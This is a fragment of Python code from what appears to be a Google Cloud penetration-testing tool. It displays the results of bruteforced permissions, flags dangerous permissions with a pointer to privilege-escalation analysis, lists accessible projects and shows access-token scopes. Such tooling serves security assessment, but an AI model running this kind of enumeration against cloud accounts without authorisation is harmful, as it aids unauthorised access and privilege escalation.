        title=f"Bruteforce Permissions Summary (GRANTED: {len(all_granted)} / TESTED: {total_tested}) [mode: {mode}]"
    )
    perm_table.add_column("Service", style="cyan")
    perm_table.add_column("Granted", style="green", justify="right")
    perm_table.add_column("Permissions (sample)")

    if not all_granted:
        perm_table.add_row("–", "0", "No permissions granted")
    else:
        for svc in sorted(by_service.keys()):
            svc_data = by_service[svc]
            granted_perms = svc_data.get("granted_permissions", [])
            if granted_perms:
                # Show up to 3 permissions as sample
                sample = ", ".join(sorted(granted_perms)[:3])
                if len(granted_perms) > 3:
                    sample += f" (+{len(granted_perms) - 3} more)"
                perm_table.add_row(svc, str(len(granted_perms)), sample)

    console.print(perm_table)

    # Show dangerous permissions if any
    if dangerous_found:
        console.print(f"\n[bold red]⚠️  Dangerous Permissions ({len(dangerous_found)}):[/bold red]")
        for perm in sorted(dangerous_found)[:10]:  # Show max 10
            console.print(f"  [red]🔥[/red] {perm}")
        if len(dangerous_found) > 10:
            console.print(f"  [dim]... and {len(dangerous_found) - 10} more[/dim]")
        console.print("\n[dim]Run 'privesc_paths' for privilege escalation analysis.[/dim]")
    else:
        console.print(
            "\n[dim]Note: permissions above come from 'bruteforce_permissions' results. "
            "Run it again with 'full' or 'low' mode for more coverage.[/dim]"
        )


def _discover_projects(session_mgr: GCPSessionManager) -> None:
    """Discover and list all accessible projects."""
    console.print("[dim]Discovering accessible projects...[/dim]")

    projects = session_mgr.discover_accessible_projects()

    if not projects:
        console.print("[yellow]No projects found. Check your credentials.[/yellow]")
        return

    console.print(f"\n[green]Found {len(projects)} accessible project(s):[/green]")
    for project in sorted(projects):
        console.print(f"  - {project}")

    console.print(f"\n[dim]Use 'set_projects <project1> <project2>' to limit enumeration scope.[/dim]")


def _display_token_info(token_info: dict) -> None:
    """Display detailed access token information."""
    from rich.table import Table

    table = Table(title="Access Token Information")
    table.add_column("Property", style="cyan")
    table.add_column("Value")

    # Identity
    if token_info.get("email"):
        table.add_row("Email", token_info.get("email"))
    if token_info.get("azp"):
        table.add_row("Authorized Party", token_info.get("azp"))
    if token_info.get("aud"):
        table.add_row("Audience", token_info.get("aud"))

    # Expiration
    if token_info.get("expires_in"):
        expires_in = int(token_info.get("expires_in", 0))
        if expires_in > 0:
            mins = expires_in // 60
            secs = expires_in % 60
            table.add_row("Expires In", f"[yellow]{mins}m {secs}s[/yellow]")
        else:
            table.add_row("Expires In", "[red]EXPIRED[/red]")

    # Scopes
    if token_info.get("scope"):
        scopes = token_info.get("scope", "").split()
        table.add_row("Scopes Count", str(len(scopes)))

        console.print(table)

        # Show scopes separately
        console.print("\n[bold]Token Scopes:[/bold]")
        for scope in sorted(scopes):
            # Highlight interesting scopes
            if "cloud-platform" in scope:
                console.print(f"  [green]✓[/green] {scope} [green](full access)[/green]")
            elif "admin" in scope.lower() or "write" in scope.lower():
                console.print(f"  [yellow]![/yellow] {scope}")
            else:
                console.print(f"  [dim]-[/dim] {scope}")
    else:
        console.print(table)

    # Access type
    if token_info.get("access_type"):
        console.print(f"\n[dim]Access Type: {token_info.get('access_type')}[/dim]")
